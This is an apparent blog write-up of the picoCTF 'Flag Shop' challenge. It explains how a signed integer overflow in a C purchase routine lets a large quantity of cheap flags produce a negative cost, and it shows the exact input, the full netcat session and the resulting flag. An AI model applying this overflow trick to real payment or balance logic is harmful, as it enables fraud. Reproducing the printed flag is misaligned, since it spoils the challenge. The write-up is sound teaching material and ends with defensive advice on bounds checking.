---
title: "picoCTF: Flag Shop"
date: 2026-07-06
tags: ["picoCTF", "Binary Exploitation", "Integer Overflow", "Reverse Engineering"]
categories: ["CTF Writeups"]
summary: "Exploiting a signed integer overflow in a C 'flag shop' program to buy a flag we couldn't otherwise afford."
draft: false
---

## Challenge Info

- **Category:** General Skills / Binary Exploitation
- **Points:** `300`
- **Description:** There's a flag shop selling stuff, can you buy a flag?
- **Connection:** `nc fickle-tempest.picoctf.net 49869`

## Recon

The challenge provides the C source code for the shop program. The key logic lives in the "buy flags" menu:

```c
if (menu == 2) {
    // Option 1: cheap fake flags at 900 each
    // Option 2: the real flag, costing 100000
    if (choice == 1) {
        scanf("%d", &number_flags);
        if (number_flags > 0) {
            int total_cost = 900 * number_flags;
            if (total_cost <= account_balance) {
                account_balance -= total_cost;
            }
        }
    }
}
```

We start with an `account_balance` of **1100**. The real flag costs **100,000** — nowhere near affordable at face value.

## Vulnerability

`total_cost` is declared as a signed 32-bit `int`. If `number_flags` is large enough, the multiplication `900 * number_flags` overflows the maximum value a signed int can hold (`2,147,483,647`) and wraps around into a **negative number**.

Since the balance update is:

```c
account_balance -= total_cost;
```

subtracting a *negative* `total_cost` effectively **adds** a large value to our balance instead of charging us.

## Exploitation

To trigger the overflow, I needed a quantity just past the point where `900 * number_flags` exceeds `2,147,483,647`. That threshold is roughly:

```
2,147,483,647 / 900 ≈ 2,386,093
```

Entering a value a bit above this threshold wraps the cost into a large negative number.

**Steps:**

1. Connect to the challenge:
   ```
   nc fickle-tempest.picoctf.net 49869
   ```
2. Select menu option `2` (Buy Flags), then option `1` (cheap/fake flags).
3. Enter an overflow quantity:
   ```
   4000000
   ```
4. The program reports a negative total cost:
   ```
   The final cost is: -694967296
   ```
5. Check balance to confirm the "purchase" actually added to our funds instead of subtracting:
   ```
   Your current balance after transaction: 694968396
   ```
   Well above the 100,000 needed for the real flag.
6. Go back to Buy Flags → select option `2` (the real flag) → enter `1` to confirm the purchase.

### Terminal Session

```
$ nc fickle-tempest.picoctf.net 49869
Welcome to the flag exchange
We sell flags

1. Check Account Balance
2. Buy Flags
3. Exit

 Enter a menu selection
1

 Balance: 1100 

Welcome to the flag exchange
We sell flags

1. Check Account Balance
2. Buy Flags
3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
4000000
The final cost is: -694967296
Your current balance after transaction: 694968396

Welcome to the flag exchange
We sell flags

1. Check Account Balance
2. Buy Flags
3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one
1
YOUR FLAG IS: picoCTF{m0n3y_bag5_F2Eb382F}

Welcome to the flag exchange
We sell flags

1. Check Account Balance
2. Buy Flags
3. Exit

 Enter a menu selection
3
```

## Flag

```
picoCTF{m0n3y_bag5_F2Eb382F}
```

## Takeaway

This is a classic **signed integer overflow** bug. User-controlled input was used directly in arithmetic (`900 * number_flags`) without any upper-bound check, letting the result wrap past the signed 32-bit boundary and flip sign. The lesson: always validate that arithmetic on user input stays within expected bounds, especially before using the result in balance or security-critical logic — and prefer unsigned types with explicit overflow checks, or a language/runtime that traps on overflow, for financial-style calculations.

## References

- picoCTF Flag Shop challenge
- Two's complement / signed integer overflow behavior in C